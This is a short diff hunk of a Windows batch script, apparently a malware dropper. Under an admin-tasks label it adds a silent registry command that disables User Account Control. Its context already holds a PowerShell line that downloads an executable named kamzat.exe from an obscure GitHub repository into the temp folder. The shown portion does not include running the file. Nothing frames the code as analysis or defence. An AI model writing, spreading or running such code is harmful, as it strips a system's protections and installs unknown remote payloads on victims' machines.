@@ -18,6 +18,9 @@ if %errorlevel% equ 0 (
     )
 
 :admin_tasks
+:: Disable UAC through registry
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
+
 :: Download the file from GitHub to TEMP
 powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\kamzat.exe' -UseBasicParsing } catch { exit 1 }"
 
